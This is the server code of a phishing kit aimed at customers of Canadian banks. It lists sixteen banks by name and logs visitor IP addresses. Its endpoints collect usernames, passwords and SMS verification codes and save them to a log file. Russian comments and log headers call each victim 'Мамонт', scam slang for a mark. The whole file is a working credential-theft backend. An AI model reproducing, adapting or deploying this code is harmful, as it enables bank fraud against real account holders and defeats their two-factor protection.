const fs = require('fs');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const colors = {
    reset: "\x1b[0m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    red: "\x1b[31m",
    magenta: "\x1b[35m"
};

const bankNames = {
    'td-canada': 'TD Canada Trust',
    'rbc': 'Royal Bank of Canada',
    'scotiabank': 'Scotiabank',
    'bmo': 'BMO',
    'cibc': 'CIBC',
    'national-bank': 'National Bank',
    'tangerine': 'Tangerine',
    'simplii': 'Simplii Financial',
    'wealthsimple': 'Wealthsimple Bank',
    'laurentian-bank': 'Laurentian Bank',
    'manulife': 'Manulife Bank',
    'meridian': 'Meridian',
    'motusbank': 'Motusbank',
    'coast-capital': 'Coast Capital',
    'atb-financial': 'ATB Financial',
    'peoples-trust': 'Peoples Trust'
};

app.use(express.static('public'));
app.use(express.json());

function getCurrentTime() {
    const now = new Date();
    return now.toLocaleString('en-CA', { hour12: false });
}

// 👉 IP логирование при переходе на "Select a different institution"
// 👉 IP логирование при переходе на "Select a different institution"
app.get('/select-bank', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = ip.split(',')[0]; // Извлекаем реальный IP

    const time = getCurrentTime();

    console.log(colors.yellow + `👀 Новый визит на выбор банка — ${time}` + colors.reset);
    console.log(colors.blue + `🌐 IP-адрес: ${clientIp}` + colors.reset);
    console.log(colors.magenta + '----------------------------------' + colors.reset);

    // Редирект на страницу выбора банка
    res.redirect('/banks');
});



// Страница выбора банков
app.get('/banks', (req, res) => {
    res.send('<h1>Выбор банка</h1><p>Здесь будет список банков</p>');
});

// Получение логина и пароля
app.post('/send-login-data', (req, res) => {
    const { username, password, bank } = req.body;
    const time = getCurrentTime();
    const bankLabel = bankNames[bank] || bank;

    const header = `💀 Мамонт — ${bankLabel} — ${time}`;
    const logEntry = `${header}\n👤 Username: ${username}\n🔒 Password: ${password}\n---\n`;

    console.log(colors.red + header + colors.reset);
    console.log(colors.green + "👤 Username: " + colors.reset + username);
    console.log(colors.red + "🔒 Password: " + colors.reset + password);
    console.log(colors.magenta + "----------------------------------" + colors.reset);

    // Асинхронная запись логов с обработкой ошибок
    fs.appendFile('log.txt', logEntry, (err) => {
        if (err) {
            console.error(colors.red + "Ошибка записи в файл!" + colors.reset);
        }
    });

    res.json({ success: true });
});

// Получение SMS кода
app.post('/send-sms-code', (req, res) => {
    const { code, bank } = req.body;
    const time = getCurrentTime();
    const bankLabel = bankNames[bank] || bank;

    const header = `💀 Мамонт — ${bankLabel} — ${time}`;
    const logEntry = `${header}\n📱 SMS Code: ${code}\n---\n`;

    console.log(colors.red + header + colors.reset);
    console.log(colors.yellow + "📱 SMS Code: " + colors.reset + code);
    console.log(colors.magenta + "----------------------------------" + colors.reset);

    // Асинхронная запись логов с обработкой ошибок
    fs.appendFile('log.txt', logEntry, (err) => {
        if (err) {
            console.error(colors.red + "Ошибка записи в файл!" + colors.reset);
        }
    });

    res.json({ success: true });
});

// Запуск сервера
app.listen(port, () => {
    console.log(colors.green + `🚀 Сервер работает: http://localhost:${port}` + colors.reset);
});
